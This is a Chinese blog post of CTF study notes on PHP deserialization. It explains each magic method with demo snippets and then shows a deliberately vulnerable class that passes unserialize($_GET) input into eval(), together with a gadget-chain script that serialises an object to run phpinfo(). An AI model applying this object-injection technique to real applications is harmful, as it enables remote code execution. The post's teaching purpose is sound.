### 说明：

​		今天的CTF遇到php反序列化的问题，之前只是稍微了解，没有认真学习过，所以今天就懵了~，好吧，当不能上多次，今天就好好记录下突击的结果吧。

## 1、介绍

PHP的反序列化网络上很多的介绍，就不再转载相关的介绍了。

一般在代码中出现`unserialize($_GET['test']);` 类似这样的方式，由于序列化的内容可控，则可能触发反序列化漏洞。



## 1.1 PHP 魔改

PHP讲以双下划线__保留为魔术方法，**所有的魔术方法 必须 声明为 public**。

```php
__construct()，类的构造函数

__destruct()，类的析构函数   ----在反序列化利用过程中，该地方是利用的入口

__call()，在对象中调用一个不可访问方法时调用，------切记是不可访问的方法才会调用，否则直接调用了指定的方法了

__callStatic()，用静态方式中调用一个不可访问方法时调用

__get()，获得一个类的成员变量时调用

__set()，设置一个类的成员变量时调用

__isset()，当对不可访问属性调用isset()或empty()时调用

__unset()，当对不可访问属性调用unset()时被调用。

__sleep()，执行serialize()时，先会调用这个函数

__wakeup()，执行unserialize()时，先会调用这个函数------反序列化时会优先调用，因此如果存在wakup（），部分的情况需要进行绕过 ，绕过的方法也很简单，修改变量的个数接口  

__toString()，类被当成字符串时的回应方法

__invoke()，调用函数的方式调用一个对象时的回应方法----

__set_state()，调用var_export()导出类时，此静态方法会被调用。

__clone()，当对象复制完成时调用

__autoload()，尝试加载未定义的类

__debugInfo()，打印所需调试信息
```

## 1.2各个魔说明

### __construct()

**__construct()**被称为构造方法，也就是在创造一个对象时候，首先会去执行的一个方法。**但是在序列化和反序列化过程是不会触发的**。因此不可用于反序列化的初始化使用。

```php
<?php
class User{

    public $username;

    public function __construct($username)
    {
        $this->username = $username;
        echo "__construct test";
    }

}
$test = new User("F0rmat");
$ser = serialize($test);
unserialize($ser);
?>
```

运行结果：

```php
__construct test
```

可以看到，创建对象的时候触发了一次，在后面的序列化和反序列化过程中都没有触发。

举个例子看下：

![image-20220925214237109](https://gitee.com/shine05/myblog-gallery/raw/master/img/image-20220925214237109.png)

![image-20220925214252472](https://gitee.com/shine05/myblog-gallery/raw/master/img/image-20220925214252472.png)

可以看到nickname 并不是__construct 设置的内容。 而是warkup中的内容。

### __destruct()   重点

在到某个对象的所有引用都被删除或者当对象被显式销毁时执行的魔术方法。**反序列化的方法的入口就是该`__destruct()`**

```php
<?php
class User{

    public function __destruct()
    {
        echo "__destruct test</br>";
    }

}
$test = new User();
$ser = serialize($test);
unserialize($ser);
?>
```

运行结果：

```php
__destruct test
__destruct test
```

可以看到执行了两次**__destruct**，因为一个就是实例化的时候创建的对象，另一个就是反序列化后生成的对象。

### __call

在对象中调用一个不可访问方法时，**__call()** 会被调用。**也就是说你调用了一个对象中不存在的方法，就会触发**。

```php
<?php
class User{

    public function __call($arg1,$arg2)
    {
        echo "$arg1,$arg2[0]";
    }

}
$test = new User();
$test->callxxx('a');
?>
```

运行结果：

```php
callxxx,a
```

可以看到__call需要定义两个参数，**一个是表示调用的函数名**，一般开发会在这里报错写xxx不存在这个函数，**第二个参数是传入的数组**，这里只传入了一个a。

### __callStatic

在静态上下文中调用一个不可访问方法时，**__callStatic()** 会被调用。

```php
<?php
class User{

    public static function __callStatic($arg1,$arg2)
    {
        echo "$arg1,$arg2[0]";
    }

}
$test = new User();
$test::callxxx('a');
?>
```

运行结果：

```php
callxxx,a
```

这里先来学习一下双冒号的用法，双冒号也叫做范围解析操作符（也可称作 Paamayim Nekudotayim）或者更简单地说是**一对冒号，可以用于访问静态成员，类常量，还可以用于覆盖类中的属性和方法**。自 PHP 5.3.0 起，可以通过变量来引用类，该变量的值不能是关键字（如 self，parent 和 static）。与**__call**不同的是需要添加**static**，只有访问不存在的静态方法才会触发。

### __get

读取不可访问属性的值时，__get() 会被调用。

```php
<?php
class User{
    public $var1;
    public  function __get($arg1)
    {
        echo $arg1;
    }

}
$test = new User();
$test->var2;
?>
```

运行结果：

```php
var2
```

**__get**魔术方法需要一个参数，这个参数代表着访问不存在的属性值。

### __set

给不可访问属性赋值时，**__set()** 会被调用。

```php
<?php
class User{
    public $var1;
    public  function __set($arg1,$arg2)
    {
        echo $arg1.','.$arg2;
    }

}
$test = new User();
$test->var2=1;
?>
```

运行结果：

```php
var2,1
```

**set跟**get相反，一个是访问不存在的属性，一个是给不存在的属性赋值。

### __isset

对不可访问属性调用 isset() 或 empty() 时，__isset() 会被调用。

```php
<?php
class User{
    private $var;
    public  function __isset($arg1)
    {
        echo $arg1;
    }

}
$test = new User();
isset($test->var1);
?>
```

运行结果：

```php
var1
```

该魔术方法使用了isset()或者empty()只要属性是private或者不存在的都会触发。

### __unset

对不可访问属性调用 unset() 时，__unset() 会被调用。

```php
<?php
class User{
    public  function __unset($arg1)
    {
        echo $arg1;
    }

}
$test = new User();
unset($test->var1);
?>
```

运行结果：

```php
var1
```

如果一个类定义了魔术方法 __unset() ，那么我们就可以使用 unset() 函数来销毁类的私有的属性，或在销毁一个不存在的属性时得到通知。

### __sleep

**serialize()** 函数会检查类中是否存在一个魔术方法 **__sleep()**。如果存在，该方法会先被调用，然后才执行序列化操作。此功能可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组。如果该方法未返回任何内容，则 NULL 被序列化，并产生一个 E_NOTICE 级别的错误。对象被序列化之前触发，返回需要被序列化存储的成员属性，删除不必要的属性。

```php
<?php
class User{
    const SITE = 'uusama';

    public $username;
    public $nickname;
    private $password;

    public function __construct($username, $nickname, $password)
    {
        $this->username = $username;
        $this->nickname = $nickname;
        $this->password = $password;
    }

    // 重载序列化调用的方法
    public function __sleep()
    {
        // 返回需要序列化的变量名，过滤掉password变量
        return array('username', 'nickname');
    }

}
$user = new User('a', 'b', 'c');
echo serialize($user);
```

运行结果：

```php
O:4:"User":2:{s:8:"username";s:1:"a";s:8:"nickname";s:1:"b";}
```

可以看到执行序列化之前会先执行**sleep()函数，上面**sleep的函数作用是过滤掉password的变量值。

### __wakeup

**unserialize() 会检查是否存在一个`__wakeup()`方法。如果存在，则会先调用 `__wakeup()` 方法**，预先准备对象需要的资源。

预先准备对象资源，返回void，常用于反序列化操作中重新建立数据库连接或执行其他初始化操作。

```php
<?php
class User{
    const SITE = 'uusama';

    public $username;
    public $nickname;
    private $password;
    private $order;

    public function __construct($username, $nickname, $password)
    {
        $this->username = $username;
        $this->nickname = $nickname;
        $this->password = $password;
    }

    // 定义反序列化后调用的方法
    public function __wakeup()
    {
        $this->password = $this->username;
    }
}
$user_ser = 'O:4:"User":2:{s:8:"username";s:1:"a";s:8:"nickname";s:1:"b";}';
var_dump(unserialize($user_ser));
```

运行结果：

```php
class User#1 (4) {
  public $username =>
  string(1) "a"
  public $nickname =>
  string(1) "b"
  private $password =>
  string(1) "a"
  private $order =>
  NULL
}
```

可以看到执行反序列化之前会先执行**wakeup()函数，上面**wakeup的函数作用是将username的变量值赋值给password变量。

### __toString

**__toString()** 方法用于一个类被当成字符串时应怎样回应。例如 echo $obj; 应该显示些什么。此方法必须返回一个字符串，否则将发出一条 E_RECOVERABLE_ERROR 级别的致命错误。

```php
<?php
class User{

    public function __toString()
    {
       return '__toString test';
    }

}

$test = new User();
echo $test;
```

运行结果：

```php
__toString
```

特别注意__toString的触发条件，引用k0rz3n师傅的笔记：

> (1)echo ($obj) / print($obj) 打印时会触发 (2)反序列化对象与字符串连接时 (3)反序列化对象参与格式化字符串时 (4)反序列化对象与字符串进行==比较时（PHP进行==比较的时候会转换参数类型） (5)反序列化对象参与格式化SQL语句，绑定参数时 (6)反序列化对象在经过php字符串函数，如 strlen()、addslashes()时 (7)在in_array()方法中，第一个参数是反序列化对象，第二个参数的数组中有toString返回的字符串的时候toString会被调用 (8)反序列化的对象作为 class_exists() 的参数的时候

### __invoke

当尝试以调用函数的方式调用一个对象时，__invoke() 方法会被自动调用。(本特性只在 PHP 5.1.0 及以上版本有效。)

```php
<?php
class User{

    public function __invoke()
    {
       echo '__invoke test';
    }

}

$test = new User();
$test();
```

运行结果：

```php
__invoke test
```

### __clone

当使用 clone 关键字拷贝完成一个对象后，新对象会自动调用定义的魔术方法 __clone() ，如果该魔术方法存在的话。

```php
<?php
class User{

    public function __clone()
    {
        echo "__clone test";
    }

}
$test = new User();
$newclass = clone($test);
?>
```

运行结果：

```php
__clone test
```



# 2、实际分析

测试个demo

```php
<?php
class index {
    public $test;
    public function __construct()
    {
        $this->test = new normal();
    }
    public function __destruct()
    {
        $this->test->action();
    }
}
class normal {
    public function action(){
        echo "please attack me";
    }
}
class evil {
    var $test2;
    public function action(){
        eval($this->test2);
    }
}
unserialize($_GET['test']);
```

解析 ：反序列化test内容，因为test内容可控，所以存在发序列化的漏洞。

一般反序列化的分析入口为`__destruct()`因此调用链可以分析如下：

__destruct()---->  $this->test->action(),如果,  this->test 出示化为normal，则调用normal1方法，同理也可以调用evil.action()方法

调用链从后往前写：先用evil.action()--->test.action --> _destruct()

因此修改调用链如下：

```php
<?php
class index {
    public $test;
}

class evil {
    var $test2 ="phpinfo();";

}
//调用链


$ev = new evil();
$a= new index();
$a->test = $ev;
echo serialize($a);
```

执行后的结果：

![image-20220925224905592](https://gitee.com/shine05/myblog-gallery/raw/master/img/image-20220925224905592.png)

说明:此处修了了index 中的$test 属性，如果该属性为private 则修改对应的执行代码如下：

当然也$test 为public也可以这么使用。

```php
<?php
class index {
    private $test;
    public function __construct()
    {
        $this->test = new evil();
    }
}

class evil {
    var $test2 = 'phpinfo();';
}
$a= new index();
echo serialize($a);
```





# 参考：

1、https://zhuanlan.zhihu.com/p/377676274